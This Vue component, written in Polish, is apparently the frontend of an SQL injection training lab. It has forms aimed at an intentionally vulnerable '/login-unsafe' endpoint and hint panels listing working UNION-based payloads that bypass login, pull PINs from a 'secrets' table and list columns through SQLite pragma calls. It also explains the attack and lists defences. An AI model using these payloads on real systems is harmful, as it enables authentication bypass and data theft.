<template>
  <div class="items-center justify-evenly full-height full-width q-pa-md" style="display: inline-grid">
    <h1 class="text-h4 text-center q-mb-md">Union-Based SQL Injection</h1>

    <q-card bordered flat class="q-pa-md">
      <q-card-section>
        <p class="text-bold">
          W tym przykładzie zobaczysz, jak atakujący może uzyskać dane z innych tabel, wykorzystując SQL UNION.
        </p>

        <q-form @submit.prevent="handleLogin" class="q-gutter-md">
          <q-input v-model.trim="username" label="Login (payload SQL)" outlined style="width: 100%; max-width: 400px" />

          <q-input v-model.trim="password" label="Hasło (payload SQL)" outlined
            style="width: 100%; max-width: 400px" />

          <q-btn color="primary" type="submit" label="Zaloguj się" />
        </q-form>
      </q-card-section>
    </q-card>

    <q-card bordered flat class="q-mt-md" v-if="loginAttempted">
      <q-card-section>
        <p v-if="loginSuccess" class="text-positive text-bold">✅ Zalogowano pomyślnie!</p>
        <p v-else class="text-negative text-bold">❌ Błędny login lub hasło.</p>
      </q-card-section>

      <q-card-section v-if="loginSuccess && user">
        <p class="text-bold">Dane użytkownika:</p>
        <pre>{{ user }}</pre>
      </q-card-section>
    </q-card>

    <q-card bordered flat class="q-pa-md q-mt-xl" style="max-width: 500px">
      <q-card-section>
        <p class="text-bold">Pobierz post na podstawie ID:</p>

        <q-form @submit.prevent="fetchPost" class="q-gutter-md">
          <q-input v-model="postId" label="ID posta (możliwy payload SQL)" outlined type="text" />

          <q-btn type="submit" color="primary" label="Pobierz post" />
        </q-form>
      </q-card-section>

      <q-card-section v-if="requestMade">
        <div v-if="post">
          <p class="text-bold">✅ Dane posta:</p>
          <pre>{{ post }}</pre>
        </div>
        <div v-else-if="sqlError">
          <p class="text-negative text-bold">❌ {{ sqlError }}</p>
        </div>
        <div v-else>
          <p class="text-negative text-bold">❌ Post nie został znaleziony.</p>
        </div>
      </q-card-section>
    </q-card>

    <q-list bordered class="rounded-borders q-mt-lg" style="max-width: 800px">
      <q-expansion-item expand-separator icon="question_mark" label="Pokaż podpowiedź">
        <q-card>
          <q-card-section>
            <strong>Logowanie:</strong>
            <ul>
              <li>
                <pre><code>' UNION SELECT 1,2,3,4,5 --</code></pre>
                <p>➡️ <code>UNION-based</code> – testowy payload do sprawdzenia liczby kolumn i struktury odpowiedzi.
                </p>
              </li>

              <li>
                <pre><code>' UNION SELECT pin, null, null, null, null FROM secrets WHERE id = 2 --</code></pre>
                <p>➡️ <code>UNION-based</code> – wyciąga tylko kolumnę <code>pin</code> z rekordu o ID = 2.</p>
              </li>

              <li>
                <pre><code>' UNION SELECT * FROM secrets WHERE id = 1 --</code></pre>
                <p>➡️ <code>UNION-based</code> – wypisuje wszystkie kolumny z tajnych danych użytkownika o ID = 1.</p>
              </li>

              <li>
                <pre><code>' UNION SELECT * FROM secrets WHERE id = 2 --</code></pre>
                <p>➡️ <code>UNION-based</code> – sztucznie wstawia dane użytkownika o ID = 2 bez potrzeby znajomości
                  hasła.</p>
              </li>

              <li>
                <pre><code>' UNION SELECT * FROM secrets WHERE userId = 1 --</code></pre>
                <p>➡️ <code>UNION-based</code> – pobiera dane z tabeli <code>secrets</code> powiązane z użytkownikiem o
                  ID = 1.</p>
              </li>

              <li>
                <pre><code>' UNION SELECT * FROM secrets WHERE userId = 3 --</code></pre>
                <p>➡️ <code>UNION-based</code> – jak wyżej, tylko dla użytkownika o ID = 3.</p>
              </li>
            </ul>
            <strong>Posty:</strong>
            <ul>
              <li>
                <code>0 UNION SELECT null, name, type, null, null, null, null FROM pragma_table_info('posts') LIMIT 1 OFFSET 3 --</code>
                <p>➡️ <code>UNION-based</code> – wypisuje nazwę i typ czwartej kolumny z tabeli <code>posts</code>
                  (OFFSET = 3).</p>
              </li>

              <li>
                <code>0 UNION SELECT name, null, null, null, pk, type, null FROM pragma_table_info('posts') LIMIT 1 OFFSET 3 --</code>
                <p>➡️ <code>UNION-based</code> – wypisuje nazwę kolumny, informację czy to klucz główny oraz typ
                  (czwarta kolumna).</p>
              </li>

              <li>
                <code>2 UNION SELECT null, (SELECT name FROM pragma_table_info('posts') WHERE cid=2), type, null, null, null, null FROM pragma_table_info('posts') --</code>
                <p>➡️ <code>UNION-based</code> – wyciąga nazwę i typ konkretnej kolumny (cid=2) z tabeli
                  <code>posts</code>.
                </p>
              </li>
            </ul>
          </q-card-section>
        </q-card>
      </q-expansion-item>

      <q-expansion-item expand-separator icon="warning" label="Dlaczego jest to niebezpieczne?">
        <q-card>
          <q-card-section>
            <p><strong>Union-Based SQL Injection</strong> umożliwia łączenie wyników z różnych zapytań. Jeśli aplikacja
              zwraca dane użytkownika z SELECT-a, atakujący może dołączyć własne dane.</p>

            <p>Przykład backendowego zapytania (podatnego):</p>
            <pre><code>
SELECT * FROM users WHERE username = '${login}' AND password = '${password}';
      </code></pre>

            <p>Atakujący w polu <code>login</code> wpisuje payload:</p>
            <pre><code>
' UNION SELECT 1, 'admin', 'admin123', 999, 'admin' --
      </code></pre>

            <p>W efekcie zapytanie SQL wygląda tak:</p>
            <pre><code>
SELECT * FROM users WHERE username = ''
UNION SELECT 1, 'admin', 'admin123', 999, 'admin' --' AND password = '...';
      </code></pre>

            <p><strong>Oryginalna tabela users:</strong></p>
            <table border="1" cellpadding="5">
              <thead>
                <tr>
                  <th>id</th>
                  <th>username</th>
                  <th>password</th>
                  <th>points</th>
                  <th>role</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>1</td>
                  <td>alice</td>
                  <td>alice123</td>
                  <td>100</td>
                  <td>user</td>
                </tr>
                <tr>
                  <td>2</td>
                  <td>bob</td>
                  <td>bob321</td>
                  <td>150</td>
                  <td>user</td>
                </tr>
              </tbody>
            </table>

            <p><strong>Dane „wstrzyknięte” przez UNION SELECT:</strong></p>
            <table border="1" cellpadding="5">
              <thead>
                <tr>
                  <th>id</th>
                  <th>username</th>
                  <th>password</th>
                  <th>points</th>
                  <th>role</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>1</td>
                  <td>admin</td>
                  <td>admin123</td>
                  <td>999</td>
                  <td>admin</td>
                </tr>
              </tbody>
            </table>

            <p><strong>Efekt:</strong> jeśli aplikacja pokaże pierwszy wiersz z wyników – użytkownik „admin” zostaje
              zalogowany bez prawdziwego hasła.</p>
          </q-card-section>
        </q-card>
      </q-expansion-item>

      <q-expansion-item expand-separator icon="warning" label="Jak działa UNION z dwiema tabelami?">
        <q-card>
          <q-card-section>
            <p>
              Załóżmy, że mamy dwie tabele:
            </p>
            <ul>
              <li><code>users(id, username, role)</code></li>
              <li><code>secrets(userId, pin)</code></li>
            </ul>

            <p>Normalne zapytanie aplikacji:</p>
            <pre><code>SELECT id, username, role FROM users WHERE username = 'alice';</code></pre>

            <p>➡️ Wynik:</p>
            <table border="1" cellpadding="5">
              <tr>
                <th>id</th>
                <th>username</th>
                <th>role</th>
              </tr>
              <tr>
                <td>1</td>
                <td>alice</td>
                <td>user</td>
              </tr>
            </table>

            <p><strong>Po zastosowaniu SQL Injection z UNION:</strong></p>
            <pre><code>
' UNION SELECT 99, pin, 'admin' FROM secrets WHERE userId = 2 --
      </code></pre>

            <p>➡️ Całe zapytanie:</p>
            <pre><code>
SELECT id, username, role FROM users WHERE username = ''
UNION SELECT 99, pin, 'admin' FROM secrets WHERE userId = 2 --';
      </code></pre>

            <p>➡️ Wynik po wykonaniu UNION:</p>
            <table border="1" cellpadding="5">
              <tr>
                <th>id</th>
                <th>username</th>
                <th>role</th>
              </tr>
              <tr>
                <td>1</td>
                <td>alice</td>
                <td>user</td>
              </tr>
              <tr>
                <td>99</td>
                <td>5678</td>
                <td>admin</td>
              </tr>
            </table>

            <p>
              Jak widać – do danych użytkownika dołączyliśmy rekord zawierający <code>pin</code> z innej tabeli.
              Jeśli aplikacja wyświetla wszystkie wyniki, napastnik może odczytać dane z innych tabel systemu.
            </p>
          </q-card-section>
        </q-card>
      </q-expansion-item>



      <!-- NOWY EXPANSION -->
      <q-expansion-item expand-separator icon="shield" label="Jak się bronić przed tym atakiem?">
        <q-card>
          <q-card-section>
            <ul>
              <li><strong>Używaj zapytań przygotowanych (prepared statements)</strong> – eliminują możliwość
                wstrzyknięcia SQL-a.</li>
              <li><strong>Waliduj dane wejściowe</strong> – np. sprawdź, czy login nie zawiera niedozwolonych znaków.
              </li>
              <li><strong>Nie zwracaj bezpośrednio danych z SELECT-a</strong> do frontendu bez kontroli.</li>
              <li><strong>Loguj podejrzane zapytania</strong> – np. zawierające słowa kluczowe typu `UNION`, `--`,
                `SELECT` itd.</li>
              <li><strong>Ogranicz uprawnienia bazy danych</strong> – użytkownik aplikacji nie powinien mieć dostępu do
                wrażliwych tabel.</li>
            </ul>
          </q-card-section>
        </q-card>
      </q-expansion-item>
    </q-list>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue'
import { api } from 'src/boot/axios'
import { useUserStore } from 'src/stores/user'

const username = ref<string>('')
const password = ref<string>('')

const loginAttempted = ref(false)
const loginSuccess = ref(false)

const user = ref(null)  // Nowy rekwizyt do przechowywania danych użytkownika

const handleLogin = async () => {
  loginAttempted.value = true

  try {
    const response = await api.post(
      '/login-unsafe',
      {
        username: username.value,
        password: password.value,
      },
      {
        withCredentials: true,
      }
    )

    loginSuccess.value = response.status === 200
    user.value = response.data.user  // Zapisanie danych użytkownika

    console.log('Login response:', response.data.user)
  } catch (error) {
    console.error(error.response || error)
    loginSuccess.value = false
  }
}

const postId = ref<string>('1')
const post = ref<any>(null)
const sqlError = ref<string | null>(null)
const requestMade = ref(false)

const fetchPost = async () => {
  post.value = null
  sqlError.value = null
  requestMade.value = false

  try {
    const response = await api.get('/post', {
      params: { id: postId.value },
    })

    post.value = response.data
  } catch (error: any) {
    post.value = null
    const status = error.response?.status
    const data = error.response?.data

    if (status === 404) {
      sqlError.value = null
    } else if (data?.blockedBy) {
      sqlError.value = `[${data.blockedBy}] ${data.error}`
    } else {
      sqlError.value = data?.error || error.message || 'Nie udało się pobrać posta.'
    }
  } finally {
    requestMade.value = true
  }
}


</script>
